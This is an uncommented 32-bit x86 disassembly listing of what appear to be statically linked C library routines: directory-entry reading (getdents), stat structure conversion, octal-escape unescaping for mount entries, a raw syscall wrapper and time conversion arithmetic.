mov eax, 0xffffffff
jmp 0x808f96e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov dword [var_1ch], 0xffffffff
mov dword [var_20h], 0xffffffff
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [var_18h], ecx
mov eax, dword [0x80aad4c]
test eax, eax
jne 0x808fe67
call fcn.08048b20
mov edx, dword [var_18h_2]
mov ecx, dword [var_14h_2]
mov edi, eax
mov esi, dword [eax]
cmp edx, 0x10c
ja 0x808fd19
mov eax, dword [var_18h_2]
add edx, 8
add eax, 0x1a
and eax, 0xfffffffc
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
mov ebx, dword [var_10h_2]
mov eax, 0xdc
int 0x80
cmp eax, 0xfffff000
ja 0x808ff96
cmp eax, 0xffffffff
je 0x808fe41
mov edx, dword [var_14h_2]
lea eax, [eax + ecx]
mov edi, ecx
cmp ecx, eax
mov dword [var_3ch], eax
mov dword [var_24h], edx
jb 0x808fd57
mov eax, dword [var_24h]
sub eax, dword [var_14h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
movzx ecx, word [edi + 0x10]
mov dword [var_28h], ecx
sub ecx, 5
and ecx, 0xfffffffc
mov dword [var_2ch], ecx
mov edx, dword [edi + 0xc]
mov eax, dword [edi + 8]
mov ebx, dword [edi]
mov esi, dword [edi + 4]
mov dword [var_34h], eax
mov dword [var_30h], edx
mov eax, dword [var_28h]
movzx edx, byte [edi + 0x12]
sub eax, 0x13
mov dword [var_8h], eax
lea eax, [edi + 0x13]
mov dword [var_4h], eax
mov byte [var_35h], dl
mov eax, dword [var_24h]
add eax, 0xb
mov dword [esp], eax
call fcn.08053690
xor edx, edx
mov ecx, dword [var_24h]
mov eax, dword [var_34h]
mov dword [ecx], ebx
mov dword [ecx + 4], eax
mov eax, dword [ecx]
mov ecx, edx
xor ecx, esi
xor eax, ebx
or ecx, eax
jne 0x808fdfd
mov eax, dword [var_34h]
mov ecx, dword [var_30h]
cdq
xor eax, dword [var_34h]
xor ecx, edx
or ecx, eax
jne 0x808fdfd
mov ecx, dword [var_30h]
mov edx, dword [var_34h]
mov ebx, dword [var_2ch]
mov dword [var_1ch_2], ecx
mov dword [var_20h_2], edx
mov ecx, dword [var_24h]
mov word [ecx + 8], bx
movzx eax, byte [var_35h]
mov byte [ecx + 0xa], al
mov edx, dword [var_2ch]
add edi, dword [var_28h]
add ecx, edx
cmp edi, dword [var_3ch]
mov dword [var_24h], ecx
jb 0x808fd57
jmp 0x808fd49
mov eax, dword [var_20h_2]
and eax, dword [var_1ch_2]
inc eax
je 0x808fe2c
mov edx, dword [var_1ch_2]
mov eax, dword [var_20h_2]
mov dword [var_sp_ch], 0
mov dword [var_8h], edx
mov dword [var_4h], eax
mov edx, dword [var_10h_2]
mov dword [esp], edx
call fcn.08054840
jmp 0x808fd49
call fcn.08048b20
mov dword [eax], 0x4b
mov eax, 0xffffffff
jmp 0x808fd4f
mov edx, dword [edi]
cmp edx, 0x16
je 0x808fe56
cmp edx, 0x26
mov eax, 0xffffffff
jne 0x808fd4f
call fcn.08048b20
mov dword [eax], esi
mov dword [0x80aad4c], 1
mov eax, dword [var_18h]
mov edx, 0x51eb851f
mov ebx, dword [var_10h]
mul edx
mov eax, dword [var_18h]
shr edx, 3
sub eax, edx
mov edx, dword [var_18h]
dec edx
cmp edx, eax
cmova edx, eax
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
mov dword [var_48h], ecx
mov eax, 0x8d
int 0x80
cmp eax, 0xfffff000
mov edi, eax
ja 0x808ff83
cmp edi, 0xffffffff
mov eax, 0xffffffff
je 0x808fd4f
add edi, dword [var_48h]
mov esi, dword [var_14h]
cmp dword [var_48h], edi
mov dword [var_40h], edi
jae 0x808ff3d
mov ecx, dword [var_18h]
lea ecx, [ecx + esi]
mov dword [var_44h], ecx
mov ebx, dword [var_48h]
movzx eax, word [ebx + 8]
lea edx, [eax + 4]
and edx, 0xfffffffc
lea edi, [edx + esi]
cmp edi, dword [var_44h]
ja 0x808ff44
mov ecx, dword [var_48h_2]
mov word [esi + 8], dx
mov eax, dword [ecx + 4]
mov dword [var_20h_2], eax
mov ebx, eax
mov eax, dword [ecx]
sar ebx, 0x1f
mov dword [var_1ch_2], ebx
mov dword [esi], eax
mov eax, dword [ecx + 4]
mov byte [esi + 0xa], 0
mov edx, dword [var_48h_2]
mov dword [esi + 4], eax
movzx eax, word [ecx + 8]
lea ecx, [esi + 0xb]
add edx, 0xa
mov dword [esp], ecx
mov esi, edi
mov dword [var_4h], edx
sub eax, 0xa
mov dword [var_8h], eax
call fcn.08053770
mov ecx, dword [var_40h_2]
mov edx, dword [var_48h_2]
movzx eax, word [edx + 8]
add edx, eax
cmp edx, ecx
mov dword [var_48h_2], edx
jb 0x808fed0
mov eax, esi
jmp 0x808fd4c
mov eax, dword [var_20h]
and eax, dword [var_1ch]
inc eax
je 0x808ffa4
mov edx, dword [var_1ch_2]
mov eax, dword [var_20h_2]
mov dword [var_sp_ch], 0
mov dword [var_8h], edx
mov dword [var_4h], eax
mov edx, dword [var_10h_2]
mov dword [esp], edx
call fcn.08054840
cmp esi, dword [var_14h_2]
jne 0x808ff3d
call fcn.08048b20
mov dword [eax], 0x16
jmp 0x808fe37
neg edi
call fcn.08048b20
mov dword [eax], edi
mov edi, 0xffffffff
jmp 0x808feab
neg eax
mov dword [edi], eax
mov eax, 0xffffffff
jmp 0x808fd2e
mov dword [var_sp_ch], str.__getdents
mov dword [var_8h], 0x10f
mov dword [var_4h], str..._sysdeps_unix_sysv_linux_getdents.c
mov dword [esp], str.last_offset____1
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
cmp eax, 1
je 0x80543c2
cmp eax, 3
jne 0x80543b0
movzx eax, word [ebx]
mov dword [ecx + 4], 0
mov dword [ecx + 0x24], 0
mov word [ecx + 8], 0
mov dword [ecx], eax
mov eax, dword [ebx + 4]
mov dword [ecx + 0xc], eax
movzx eax, word [ebx + 8]
mov dword [ecx + 0x10], eax
movzx eax, word [ebx + 0xa]
mov dword [ecx + 0x14], eax
movzx eax, word [ebx + 0xc]
mov dword [ecx + 0x18], eax
movzx eax, word [ebx + 0xe]
mov dword [ecx + 0x1c], eax
movzx eax, word [ebx + 0x10]
mov word [ecx + 0x28], 0
mov dword [ecx + 0x20], eax
mov eax, dword [ebx + 0x14]
mov dword [ecx + 0x2c], eax
mov eax, dword [ebx + 0x18]
mov dword [ecx + 0x30], eax
mov eax, dword [ebx + 0x1c]
mov dword [ecx + 0x34], eax
mov eax, dword [ebx + 0x20]
mov dword [ecx + 0x38], eax
mov eax, dword [ebx + 0x24]
mov dword [ecx + 0x3c], eax
mov eax, dword [ebx + 0x28]
mov dword [ecx + 0x40], eax
mov eax, dword [ebx + 0x2c]
mov dword [ecx + 0x44], eax
mov eax, dword [ebx + 0x30]
mov dword [ecx + 0x48], eax
mov eax, dword [ebx + 0x34]
mov dword [ecx + 0x54], 0
mov dword [ecx + 0x50], 0
mov dword [ecx + 0x4c], eax
xor eax, eax
pop ebx
leave
ret
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x80543ad
mov eax, dword [ebx]
mov dword [ecx], eax
mov eax, dword [ebx + 4]
mov dword [ecx + 4], eax
mov eax, dword [ebx + 8]
mov dword [ecx + 8], eax
mov eax, dword [ebx + 0xc]
mov dword [ecx + 0xc], eax
mov eax, dword [ebx + 0x10]
mov dword [ecx + 0x10], eax
mov eax, dword [ebx + 0x14]
mov dword [ecx + 0x14], eax
mov eax, dword [ebx + 0x18]
mov dword [ecx + 0x18], eax
mov eax, dword [ebx + 0x1c]
mov dword [ecx + 0x1c], eax
mov eax, dword [ebx + 0x20]
mov dword [ecx + 0x20], eax
mov eax, dword [ebx + 0x24]
mov dword [ecx + 0x24], eax
mov eax, dword [ebx + 0x28]
mov dword [ecx + 0x28], eax
mov eax, dword [ebx + 0x2c]
mov dword [ecx + 0x2c], eax
mov eax, dword [ebx + 0x30]
mov dword [ecx + 0x30], eax
mov eax, dword [ebx + 0x34]
mov dword [ecx + 0x34], eax
mov eax, dword [ebx + 0x38]
mov dword [ecx + 0x38], eax
mov eax, dword [ebx + 0x3c]
mov dword [ecx + 0x3c], eax
jmp 0x80543ab
push ebp
mov ebp, esp
push edi
mov eax, dword [arg_8h]
push esi
mov edi, dword [arg_10h]
push ebx
cmp eax, 1
je 0x8054516
cmp eax, 3
je 0x805452b
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov word [edi + 8], 0
mov edx, dword [ecx + 4]
mov eax, dword [ecx]
mov dword [edi + 4], edx
mov dword [edi], eax
mov esi, dword [ecx + 0x5c]
mov ebx, dword [ecx + 0x58]
mov edx, esi
or edx, ebx
jne 0x8054612
mov eax, dword [ecx + 0xc]
mov dword [edi + 0xc], eax
mov ecx, dword [arg_ch]
mov word [edi + 0x28], 0
mov eax, dword [ecx + 0x10]
mov edx, dword [ecx + 0x24]
mov esi, ecx
mov dword [edi + 0x10], eax
mov eax, dword [ecx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [ecx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [ecx + 0x1c]
mov dword [edi + 0x1c], eax
mov eax, dword [ecx + 0x20]
mov dword [edi + 0x24], edx
mov dword [edi + 0x20], eax
mov edx, dword [esi + 0x30]
mov eax, dword [ecx + 0x2c]
mov ecx, eax
mov ebx, eax
mov dword [edi + 0x2c], eax
mov eax, dword [esi + 0x2c]
sar ebx, 0x1f
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054602
mov edx, dword [arg_ch]
mov eax, dword [edx + 0x34]
mov dword [edi + 0x30], eax
mov eax, dword [edx + 0x38]
mov ecx, eax
mov ebx, eax
mov dword [edi + 0x34], eax
mov eax, dword [edx + 0x38]
sar ebx, 0x1f
mov edx, dword [edx + 0x3c]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054602
mov edx, dword [arg_ch]
mov eax, dword [edx + 0x40]
mov dword [edi + 0x38], eax
mov eax, dword [edx + 0x44]
mov dword [edi + 0x3c], eax
mov eax, dword [edx + 0x48]
mov dword [edi + 0x40], eax
mov eax, dword [edx + 0x4c]
mov dword [edi + 0x44], eax
mov eax, dword [edx + 0x50]
mov dword [edi + 0x48], eax
mov eax, dword [edx + 0x54]
mov dword [edi + 0x54], 0
mov dword [edi + 0x50], 0
mov dword [edi + 0x4c], eax
xor eax, eax
jmp 0x8054526
call fcn.08048b20
mov dword [eax], 0x4b
jmp 0x8054521
mov edx, dword [arg_ch]
mov eax, dword [edx + 0x58]
xor edx, edx
mov ecx, edx
xor ecx, esi
mov dword [edi + 0xc], eax
mov eax, dword [edi + 0xc]
xor eax, ebx
or ecx, eax
je 0x8054554
jmp 0x8054602
push ebp
mov ebp, esp
push edi
mov edi, dword [arg_8h]
push esi
push ebx
mov edx, edi
mov ecx, edi
lea esi, [esi]
movzx eax, byte [edx]
cmp al, 0x5c
je 0x8090349
mov byte [ecx], al
inc ecx
movzx eax, byte [edx]
inc edx
test al, al
jne 0x8090330
pop ebx
pop esi
mov eax, edi
pop edi
leave
ret
cmp byte [edx + 1], 0x30
je 0x80903b6
cmp al, 0x5c
jne 0x8090337
cmp byte [edx + 1], 0x30
je 0x80903a5
cmp al, 0x5c
jne 0x8090337
cmp byte [edx + 1], 0x30
je 0x8090394
cmp al, 0x5c
jne 0x8090337
movzx esi, byte [edx + 1]
mov ebx, esi
cmp bl, 0x5c
je 0x809038e
mov ebx, esi
cmp bl, 0x31
jne 0x8090337
cmp byte [edx + 2], 0x33
jne 0x8090337
cmp byte [edx + 3], 0x34
jne 0x8090337
mov byte [ecx], 0x5c
inc ecx
add edx, 3
jmp 0x809033a
mov byte [ecx], 0x5c
inc edx
jmp 0x8090339
cmp byte [edx + 2], 0x31
jne 0x8090363
cmp byte [edx + 3], 0x32
jne 0x8090363
mov byte [ecx], 0xa
jmp 0x8090388
cmp byte [edx + 2], 0x31
jne 0x8090359
cmp byte [edx + 3], 0x31
jne 0x8090359
mov byte [ecx], 9
jmp 0x8090388
cmp byte [edx + 2], 0x34
jne 0x809034f
cmp byte [edx + 3], 0x30
jne 0x809034f
mov byte [ecx], 0x20
jmp 0x8090388
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x68
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov edx, dword [arg_8h]
mov eax, dword [arg_10h]
mov ecx, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call dword [ecx + 0x20]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov ebx, dword [arg_10h]
mov esi, dword [arg_ch]
mov edi, dword [arg_8h]
test edi, edi
je 0x808eca4
mov eax, 0
test eax, eax
je 0x808eb6f
mov dword [esp], 0x80aaa6c
call section.
xor eax, eax
cmp ebx, 0x80aad60
sete al
call fcn.0808df20
mov eax, dword [0x80aad48]
test eax, eax
je 0x808ec6e
lea eax, [var_10h]
mov dword [var_sp_10h], ebx
mov dword [var_4h], esi
mov dword [var_ch], eax
lea eax, [var_14h]
mov dword [var_8h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.0808f720
test ebx, ebx
je 0x808ec1f
test esi, esi
je 0x808ec57
mov esi, dword [0x80aad48]
test esi, esi
jne 0x808ec00
mov eax, dword [0x80aaab8]
mov ecx, dword [0x80aaad8]
cmp eax, ecx
jg 0x808ec44
mov edx, dword [edi]
xor esi, esi
cmp edx, eax
jl 0x808ebe3
cmp edx, ecx
mov eax, 1
cmovl esi, eax
mov eax, dword [esi*4 + 0x80a9c28]
mov dword [ebx + 0x20], esi
shl esi, 5
mov dword [ebx + 0x28], eax
lea eax, [esi + 0x80aaaa4]
mov eax, dword [eax + 0x10]
mov dword [ebx + 0x24], eax
nop
mov dword [var_8h], ebx
mov eax, dword [ebx + 0x24]
mov dword [esp], edi
sub eax, dword [var_14h]
mov dword [var_4h], eax
call fcn.08090f00
test eax, eax
je 0x808ec40
mov eax, dword [var_10h]
add dword [ebx], eax
mov eax, 0
test eax, eax
je 0x808ec34
mov dword [esp], 0x80aaa6c
call section.
mov eax, ebx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov esi, esi
xor ebx, ebx
jmp 0x808ec1f
mov edx, dword [edi]
xor esi, esi
cmp edx, ecx
jl 0x808ec50
cmp edx, eax
jl 0x808ebe3
mov esi, 1
jmp 0x808ebe3
mov dword [ebx + 0x20], 0
mov dword [ebx + 0x28], 0x80a7230
mov dword [ebx + 0x24], 0
jmp 0x808ec00
mov dword [var_8h], ebx
mov dword [var_4h], 0
mov dword [esp], edi
call fcn.08090f00
test eax, eax
jne 0x808ec9b
xor ebx, ebx
mov dword [var_14h], 0
mov dword [var_10h], 0
jmp 0x808ebac
mov eax, ebx
call fcn.0808eab0
jmp 0x808ec88
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
jmp 0x808ec36
push ebp
mov eax, 1
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov edx, dword [arg_1ch]
mov edi, dword [arg_8h]
test edx, edx
je 0x80913c2
mov eax, edi
sar eax, 2
lea esi, [eax + 0x1db]
add eax, 0x1da
test edi, 3
cmove esi, eax
mov eax, dword [arg_1ch]
mov eax, dword [eax + 0x14]
test al, 3
mov dword [var_14h], eax
jne 0x80913ca
sar eax, 2
add eax, 0x1da
mov dword [var_10h], eax
mov ebx, 0x51eb851f
mov ecx, esi
mov eax, esi
sub edi, dword [var_14h]
imul ebx
mov eax, esi
sub esi, dword [var_10h]
sar eax, 0x1f
imul edi, edi, 0x16d
sar edx, 3
sub edx, eax
lea eax, [edx + edx*2]
lea eax, [edx + eax*8]
sub ecx, eax
mov eax, dword [var_10h]
shr ecx, 0x1f
sub edx, ecx
mov ecx, edx
imul ebx
mov eax, dword [var_10h]
sar eax, 0x1f
mov ebx, edx
mov edx, dword [var_10h]
sar ebx, 3
sub ebx, eax
lea eax, [ebx + ebx*2]
lea eax, [ebx + eax*8]
sub edx, eax
mov eax, ecx
shr edx, 0x1f
sar eax, 2
sub ebx, edx
mov edx, ebx
sar ebx, 2
sub ecx, edx
sub eax, ebx
mov edx, dword [arg_1ch]
sub esi, ecx
lea eax, [eax + esi]
mov edx, dword [edx + 0x1c]
lea eax, [eax + edi]
sub dword [arg_ch], edx
mov edx, dword [arg_1ch]
add eax, dword [arg_ch]
mov edx, dword [edx + 8]
sub dword [arg_10h], edx
mov edx, dword [arg_10h]
lea eax, [eax + eax*2]
lea eax, [edx + eax*8]
mov edx, eax
shl edx, 4
sub edx, eax
mov eax, dword [arg_1ch]
mov eax, dword [eax + 4]
sub dword [arg_14h], eax
mov eax, dword [arg_14h]
lea edx, [eax + edx*4]
mov eax, edx
shl eax, 4
sub eax, edx
mov edx, dword [arg_1ch]
mov edx, dword [edx]
sub dword [arg_18h], edx
mov edx, dword [arg_18h]
lea eax, [edx + eax*4]
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
sar eax, 2
add eax, 0x1db
jmp 0x809130e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x38
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [arg_8h]
test eax, eax
mov edx, eax
je 0x8091409
add esp, 0x38
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov eax, dword [ecx]
test eax, eax
je 0x80913ff
mov ebx, eax
xor edi, edi
test ebx, ebx
lea eax, [edi - 1]
js 0x8091420
lea eax, [edi + 1]
cmp ebx, eax
je 0x809149d
test ebx, ebx
js 0x8091492
mov eax, ebx
sub eax, edi
sar eax, 1
lea esi, [eax + edi]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov dword [eax], esi
mov dword [esp], eax
mov dword [var_4h], edx
call dword [arg_8h]
test eax, eax
mov edx, eax
je 0x809148e
mov eax, dword [eax]
mov edi, esi
mov dword [var_3ch], eax
mov eax, dword [edx + 4]
mov dword [var_38h], eax
mov eax, dword [edx + 8]
mov dword [var_34h], eax
mov eax, dword [edx + 0xc]
mov dword [var_30h], eax
mov eax, dword [edx + 0x10]
mov dword [var_2ch], eax
mov eax, dword [edx + 0x14]
mov dword [var_28h], eax
mov eax, dword [edx + 0x18]
mov dword [var_24h], eax
mov eax, dword [edx + 0x1c]
mov dword [var_20h], eax
mov eax, dword [edx + 0x20]
mov dword [var_1ch], eax
mov eax, dword [edx + 0x24]
mov dword [var_18h], eax
mov eax, dword [edx + 0x28]
mov dword [var_14h], eax
jmp 0x8091416
mov ebx, esi
jmp 0x8091416
mov eax, edi
sub eax, ebx
sar eax, 1
lea esi, [eax + ebx]
jmp 0x8091431
test edx, edx
jne 0x80913ff
test edi, edi
je 0x80913ff
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov dword [ecx], edi
mov eax, dword [var_3ch]
mov dword [edx], eax
mov eax, dword [var_38h]
mov dword [edx + 4], eax
mov eax, dword [var_34h]
mov dword [edx + 8], eax
mov eax, dword [var_30h]
mov dword [edx + 0xc], eax
mov eax, dword [var_2ch]
mov dword [edx + 0x10], eax
mov eax, dword [var_28h]
mov dword [edx + 0x14], eax
mov eax, dword [var_24h]
mov dword [edx + 0x18], eax
mov eax, dword [var_20h]
mov dword [edx + 0x1c], eax
mov eax, dword [var_1ch]
mov dword [edx + 0x20], eax
mov eax, dword [var_18h]
mov dword [edx + 0x24], eax
mov eax, dword [var_14h]
mov dword [edx + 0x28], eax
jmp 0x80913ff
push ebp
mov eax, 0
mov ebp, esp
sub esp, 4
test eax, eax
je 0x808eafb
mov dword [esp], 0x80aaa6c
call section.
mov eax, 1
call fcn.0808df20
mov ecx, dword [0x80aad48]
test ecx, ecx
jne 0x808eb23
mov eax, dword [0x80aaaa0]
mov dword [0x80a9c28], eax
mov eax, dword [0x80aaac0]
mov dword [0x80a9c2c], eax
mov eax, 0
test eax, eax
je 0x808eb38
mov dword [esp], 0x80aaa6c
call section.
leave
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0xc0
mov edx, dword [arg_8h]
mov eax, dword [arg_8h]
mov dword [var_80h], 6
mov eax, dword [eax]
mov edx, dword [edx + 4]
mov dword [var_84h], eax
mov dword [var_88h], edx
mov eax, dword [arg_8h]
mov edx, dword [arg_8h]
mov eax, dword [eax + 8]
mov edx, dword [edx + 0xc]
mov dword [var_8ch], eax
mov eax, dword [arg_8h]
mov dword [var_90h], edx
mov ecx, dword [eax + 0x10]
mov edx, dword [eax + 0x14]
mov eax, dword [eax + 0x20]
mov dword [var_94h], edx
mov edx, 0x2aaaaaab
mov dword [var_98h], eax
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
sar edx, 1
sub edx, eax
lea eax, [edx + edx*2]
shl eax, 2
sub ecx, eax
mov eax, dword [var_94h]
mov esi, ecx
shr esi, 0x1f
sub edx, esi
add eax, edx
mov dword [var_a0h], edx
mov ebx, eax
mov dword [var_a4h], eax
add ebx, 0x76c
test bl, 3
jne 0x80915e2
mov eax, 0x51eb851f
imul ebx
mov eax, edx
mov dword [var_b4h], edx
mov edx, ebx
sar edx, 0x1f
sar eax, 5
sub eax, edx
mov dword [var_ach], edx
imul eax, eax, 0x64
cmp ebx, eax
jne 0x80915dd
mov edx, dword [var_b4h]
sar edx, 7
sub edx, dword [var_ach]
imul edx, edx, 0x190
cmp ebx, edx
jne 0x80915e2
mov edi, 1
lea eax, [edi + edi]
lea edx, [esi + esi]
add eax, edi
add edx, esi
lea eax, [edi + eax*4]
lea edx, [eax + edx*4]
add edx, ecx
cmp dword [var_a4h], 0x44
movzx eax, word [edx + edx + 0x80a7340]
mov edx, dword [var_90h]
lea eax, [edx + eax - 1]
mov edx, 0xffffffff
mov dword [var_a8h], eax
mov eax, dword [var_84h]
mov dword [var_b0h], eax
jle 0x8091750
test eax, eax
mov edx, 0
mov dword [var_28h], 0x46
cmovns edx, eax
mov dword [var_3ch], 0
mov dword [var_38h], 0
cmp edx, 0x3c
mov eax, 0x3b
mov dword [var_34h], 0
cmovl eax, edx
mov dword [var_20h], 0
mov dword [var_84h], eax
mov edx, dword [var_84h]
lea eax, [var_3ch]
mov dword [var_14h], eax
mov eax, dword [var_88h]
mov dword [var_10h], edx
mov edx, dword [var_8ch]
mov dword [var_ch], eax
mov eax, dword [var_a8h]
mov dword [var_8h], edx
mov edx, dword [var_a4h]
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.080912c0
mov dword [var_9ch], 0
mov esi, eax
mov dword [var_78h], eax
mov eax, dword [arg_10h]
add esi, dword [eax]
mov dword [var_7ch], esi
mov dword [var_70h], esi
nop
lea edx, [var_3ch]
lea eax, [var_70h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov edx, dword [arg_ch]
mov dword [esp], edx
call fcn.080913e0
mov edx, dword [var_88h]
mov dword [var_14h], eax
mov eax, dword [var_84h]
mov dword [var_ch], edx
mov edx, dword [var_a8h]
mov dword [var_10h], eax
mov eax, dword [var_8ch]
mov dword [var_4h], edx
mov dword [var_8h], eax
mov eax, dword [var_a4h]
mov dword [esp], eax
call fcn.080912c0
test eax, eax
mov ebx, eax
je 0x80919ae
mov ecx, dword [var_70h]
cmp ecx, dword [var_7ch]
mov edi, ecx
je 0x809175d
dec dword [var_80h]
je 0x809174b
xor eax, eax
lea ecx, [ebx + edi]
mov dword [var_7ch], esi
cmp dword [var_1ch], 0
mov dword [var_70h], ecx
mov esi, edi
setne al
mov dword [var_9ch], eax
jmp 0x80916c0
mov edx, 0xffffffff
add esp, 0xc0
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
cmp ecx, esi
je 0x8091727
mov eax, dword [var_1ch]
test eax, eax
js 0x8091783
cmp dword [var_98h], 0
jl 0x8091995
setne dl
test eax, eax
setne al
xor eax, edx
test al, 1
je 0x8091727
test ebx, ebx
jne 0x80917f8
mov eax, dword [var_1ch]
cmp dword [var_98h], eax
je 0x80917f8
mov edi, dword [var_98h]
test edi, edi
js 0x80917f8
test eax, eax
js 0x80917f8
mov esi, 0x786156
cmp ecx, 0x81692401
mov eax, 0xff879eaa
cmovle esi, eax
mov ebx, 1
lea edi, [var_74h]
mov eax, ebx
mov edx, dword [arg_ch]
mov dword [var_4h], edi
imul eax, esi
mov dword [esp], edx
sub ecx, eax
lea eax, [var_6ch]
mov dword [var_74h], ecx
mov dword [var_8h], eax
call fcn.080913e0
mov eax, dword [var_98h]
cmp dword [var_4ch], eax
je 0x8091934
inc ebx
cmp ebx, 3
jg 0x80917f5
mov ecx, dword [var_70h]
jmp 0x80917bb
mov ecx, dword [var_70h]
mov eax, ecx
mov edx, dword [arg_10h]
sub eax, dword [var_78h]
mov dword [edx], eax
mov eax, dword [var_3ch]
cmp dword [var_b0h], eax
je 0x8091855
mov esi, dword [var_84h]
mov ebx, dword [var_b0h]
xor edx, edx
sub ebx, dword [var_84h]
test esi, esi
jne 0x8091830
cmp eax, 0x3c
mov eax, 1
cmove edx, eax
lea eax, [edx + ebx]
lea edx, [var_70h]
add ecx, eax
mov dword [esp], edx
lea eax, [var_3ch]
mov dword [var_70h], ecx
mov dword [var_4h], eax
call dword [arg_ch]
mov edx, 0xffffffff
test eax, eax
je 0x8091750
fild dword [ebp - 0xa0]
fild dword [ebp - 0x94]
fld dword [0x80a737c]
fxch st(1)
faddp st(2)
fild dword [ebp - 0x28]
fsubp st(2)
fild dword [ebp - 0x90]
fxch st(2)
fmul dword [0x80a7374]
faddp st(2)
fild dword [ebp - 0x8c]
fxch st(2)
fmul dword [0x80a7378]
faddp st(2)
fild dword [ebp - 0x88]
fxch st(2)
fmul st(1)
faddp st(2)
fild dword [ebp - 0xb0]
fxch st(2)
fmulp st(1)
faddp st(1)
fldz
fucompi st(1)
jbe 0x809192a
fld qword [0x80a7380]
fucompi st(1)
fstp st(0)
ja 0x809174b
cmp dword [var_a4h], 0x45
je 0x8091915
mov ecx, dword [var_70h]
mov eax, dword [var_3ch]
mov edx, dword [arg_8h]
mov dword [edx], eax
mov eax, dword [var_38h]
mov dword [edx + 4], eax
mov eax, dword [var_34h]
mov dword [edx + 8], eax
mov eax, dword [var_30h]
mov dword [edx + 0xc], eax
mov eax, dword [var_2ch]
mov dword [edx + 0x10], eax
mov eax, dword [var_28h]
mov dword [edx + 0x14], eax
mov eax, dword [var_24h]
mov dword [edx + 0x18], eax
mov eax, dword [var_20h]
mov dword [edx + 0x1c], eax
mov eax, dword [var_1ch]
mov dword [edx + 0x20], eax
mov eax, dword [var_18h]
mov dword [edx + 0x24], eax
mov eax, dword [var_bp_14h]
mov dword [edx + 0x28], eax
mov edx, ecx
jmp 0x8091750
mov ecx, dword [var_70h]
mov edx, 0xffffffff
cmp ecx, 0x2a300
jbe 0x80918ca
jmp 0x8091750
fld qword [0x80a7388]
fxch st(1)
jmp 0x80918b4
mov eax, dword [var_84h]
lea edx, [var_6ch]
mov dword [var_14h], edx
mov edx, dword [var_88h]
mov dword [var_10h], eax
mov eax, dword [var_8ch]
mov dword [var_ch], edx
mov edx, dword [var_a8h]
mov dword [var_8h], eax
mov eax, dword [var_a4h]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.080912c0
lea edx, [var_3ch]
add eax, dword [var_74h]
mov dword [var_8h], edx
mov edx, dword [arg_ch]
mov dword [esp], edx
mov dword [var_70h], eax
lea eax, [var_70h]
mov dword [var_4h], eax
call fcn.080913e0
jmp 0x80917f5
test eax, eax
setne al
movzx eax, al
cmp dword [var_9ch], eax
jg 0x8091727
jmp 0x8091783
mov ecx, dword [var_70h]
jmp 0x8091783
push ebp
mov edx, 1
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx]
test eax, eax
jne 0x8091b9e
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
add eax, 4
mov dword [esp], eax
call fcn.08091b80
xor edx, edx
test al, al
je 0x8091b97
mov edx, dword [ebx]
xor eax, eax
mov ecx, dword [edx]
cmp eax, ecx
jae 0x8091bcc
lea esi, [esi]
cmp dword [edx + eax*8 + 0xc], 0
jne 0x8091be1
inc eax
cmp eax, ecx
jb 0x8091bc0
mov dword [esp], edx
call fcn.08051180
mov dword [ebx], 0
mov edx, 1
jmp 0x8091b97
xor edx, edx
jmp 0x8091b97
push ebp
mov ebp, esp
push ebx
mov ebx, eax
sub esp, 4
mov eax, dword [eax + 0x14]
test eax, eax
jne 0x8091d5f
mov eax, dword [ebx + 0x1c]
test eax, eax
jne 0x8091d58
mov edx, ebx
mov ebx, dword [ebx + 0x18]
mov eax, dword [edx + 0x10]
cmp byte [eax], 0x2f
je 0x8091d4e
test ebx, ebx
jne 0x8091d37
add esp, 4
pop ebx
leave
ret
mov dword [esp], edx
